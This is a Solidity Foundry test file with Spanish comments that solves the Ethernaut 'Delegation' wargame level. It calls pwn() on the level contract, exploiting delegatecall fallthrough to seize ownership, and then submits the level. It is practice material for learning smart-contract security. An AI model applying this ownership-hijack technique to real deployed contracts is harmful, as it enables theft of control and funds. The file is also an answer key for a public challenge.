// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/console.sol";
import "./Delegation.sol";
import "./DelegationFactory.sol";
import "../Ethernaut.sol";

contract DelegationTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D)); // Como una blockchain local
    Ethernaut ethernaut; // EL juego de ethernauta

    address eoaAddress = address(10);
    
    function setUp() public {
        vm.deal(eoaAddress, 5 ether);
        ethernaut = new Ethernaut();
    }

    function testDelegationHack() public {
        // SETUP
        DelegationFactory delegationFactory = new DelegationFactory(); // cosa que sabe como crear niveles
        ethernaut.registerLevel(delegationFactory);
        
        vm.startPrank(eoaAddress); // msg.sender en todas las transacciones que haga sera el que le paso aca
        
        address levelAddress = ethernaut.createLevelInstance(delegationFactory); // Retorna la direccion del Delegation

        // "HACKING"
        (bool sucess, bytes memory data) = address(levelAddress).call(abi.encodeWithSignature("pwn()"));

        assert(sucess);

        // Asserts
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
